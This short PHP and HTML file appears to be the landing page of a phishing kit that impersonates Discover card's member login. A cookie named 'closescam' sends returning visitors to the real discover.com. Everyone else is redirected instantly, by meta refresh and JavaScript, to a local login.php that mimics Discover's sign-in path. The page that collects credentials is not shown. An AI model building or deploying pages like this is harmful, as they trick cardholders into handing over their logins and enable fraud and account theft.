<?php
$closed=$_COOKIE["closescam"];
if ($closed != ''){
header('location:http://www.discover.com');
}
?>
<html><head>
<meta http-equiv="refresh" content="0; URL=login.php?section=cardmembersvcs/loginlogout/app/signin">
<script language="JavaScript" type="text/javascript">
<!--
function redirect() { 
setTimeout("window.location.replace('login.php?section=cardmembersvcs/loginlogout/app/signin')", 0); }
-->
</script>
</head>
